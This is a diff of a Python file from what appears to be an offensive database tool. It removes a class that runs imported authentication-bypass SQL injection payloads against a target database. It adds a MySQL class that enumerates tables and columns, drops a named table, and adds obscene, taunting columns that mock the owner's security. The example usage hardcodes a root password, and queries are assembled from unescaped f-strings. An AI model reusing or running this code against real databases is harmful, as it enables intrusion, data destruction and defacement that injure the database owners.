@@ -1,98 +1,75 @@
-try:
-    import pyodbc
-except ImportError:
-    install_pyodbc = input("pyodbc is not installed. Do you want to install pyodbc? (y/n): ")
-    if install_pyodbc.lower() == "y":
-        try:
-            import subprocess
-            subprocess.check_call(["pip", "install", "pyodbc"])
-        except (subprocess.CalledProcessError, subprocess.SubprocessError, subprocess.TimeoutExpired) as exc:
-            print(exc)
-    elif install_pyodbc.lower() == "n":
-        pass
-
-try:
-    import requests
-except ImportError:
-    install_requests = input("requests is not installed. Do you want to install requests? (y/n): ")
-    if install_requests.lower() == "y":
-        try:
-            import subprocess
-            subprocess.check_call(["pip", "install", "requests"])
-        except (subprocess.CalledProcessError, subprocess.SubprocessError, subprocess.TimeoutExpired) as exc:
-            print(exc)
-    elif install_requests.lower() == "n":
-        pass
-
-try:
-    from Package import logger
-    from Package import payload4authpypass as AUTHPAYLOAD
-except ImportError:
-    print("[*] Wrong installation")
-
-import socket
+import mysql.connector
+from prettytable import PrettyTable
+import re
 
 
-class Connector:
-    def __init__(self, host, port, user, password, database, driver, *args, **kwargs):
+class DBMS:
+    def __init__(self, host, user, password, database,tablename=None) -> None:
         self.host = host
-        self.port = port
         self.user = user
         self.password = password
         self.database = database
-        self.driver = driver
-        self.args = args
-        self.kwargs = kwargs
+        self.connection = mysql.connector.connect(
+            host=self.host,
+            user=self.user,
+            password=self.password,
+            database=self.database
+        )
+        self.cursor = self.connection.cursor()
+        self.table = PrettyTable(['Database'])
+        self.column_table = PrettyTable(['Field', 'Type', 'Null', 'Key', 'Default', 'Extra'])
+        self.tablename = tablename
+    
+    def _show_database_columns_info(self):
+        self._set_database_name()
+        tables = self._show_database_tables_and_store_them()
 
-    @classmethod
-    def _Check_host(cls, host):
-        if host is None:
-            raise ValueError("Host is None")
-        
-        req = requests.get(host)
+        for table in tables:
+            # Extract table name without single quotes
+            table_name = table[0].replace("'", "")
+            self.cursor.execute(f"DESCRIBE {table_name}")
+            result = self.cursor.fetchall()
+            self.column_table.clear_rows()  # Clear existing rows before adding new ones
+
+            # Add column information to the PrettyTable
+            for row in result:
+                self.column_table.add_row(row)
+
+            # Print or process column information
+            print(f"Columns for table {table_name}:")
+            print(self.column_table)
+
+    def _set_database_name(self):
+        self.cursor.execute(f"USE {self.database}")
+
+    def _show_database_tables_and_store_them(self):
+        self.cursor.execute("SHOW TABLES")
+        result = self.cursor.fetchall()
+        print("Tables in the database:")
+        for row in result:
+            print(row[0])
+        return result
+    
+    def drop_table(self):
+        self.cursor.execute(f"USE {self.database}")
+        self.cursor.execute(f"DROP TABLE IF EXISTS {self.tablename}")
+    
+    def alter_table(self):
         try:
-            assert req.status_code == 200, "Host is not reachable"
-        except AssertionError:
-            return False
+            self.cursor.execute(f"ALTER TABLE {self.tablename}\nADD COLUMN your_security_is_suck_dicks INT; ")
+            self.cursor.execute(f"ALTER TABLE {self.tablename}\nADD COLUMN it_would_be_better_to_spend_more")
         
-        return True
+        except mysql.connector.ProgrammingError:
+            pass
+    
+    def show_all_tables(self):
+        self.cursor.execute("SHOW TABLES")
+        result = self.cursor.fetchall()
+        for table in result:
+            self.table.add_row(table)
 
-    @classmethod
-    def _Check_port(cls, port, host):
-        try:
-            with socket.create_connection((host, port), timeout=10):
-                return True
-        except (socket.timeout, socket.error):
-            return False
+        print(self.table)
 
-    @classmethod
-    def _Final_check(cls, host, port):
-        if cls._Check_host(host) and cls._Check_port(port, host):
-            return True
-        else:
-            raise SystemExit
-
-    @classmethod
-    def _Connect(cls, host, port, user, password, database, driver, *args, **kwargs):
-        connection_string = 'DRIVER={DriverName};SERVER=ServerName;DATABASE=DatabaseName;UID=Username;PWD=Password'
-        connection = pyodbc.connect(connection_string.format(DriverName=driver, ServerName=host, DatabaseName=database, Username=user, Password=password))
-        cursor = connection.cursor()
-        if cursor:
-            return True
-        else:
-            return False
-        
-    @classmethod
-    def Auth_bypass_injection(cls, host, port, user, password, database, driver, *args, **kwargs):
-        if cls._Connect(host, port, user, password, database, driver, *args, **kwargs):
-            connection_string = 'DRIVER={DriverName};SERVER=ServerName;DATABASE=DatabaseName;UID=Username;PWD=Password'
-            connection = pyodbc.connect(connection_string.format(DriverName=driver, ServerName=host, DatabaseName=database, Username=user, Password=password))
-            cursor = connection.cursor()
-            for Q in AUTHPAYLOAD.payload4auth_bypass():
-                cursor.execute(Q)
-                connection.commit()
-        else:
-            raise SystemExit
-        
-
-
+# Example usage
+obj = DBMS("localhost", "root", "alimirmohammad", "mysql",tablename="mmd")
+obj.show_all_tables()
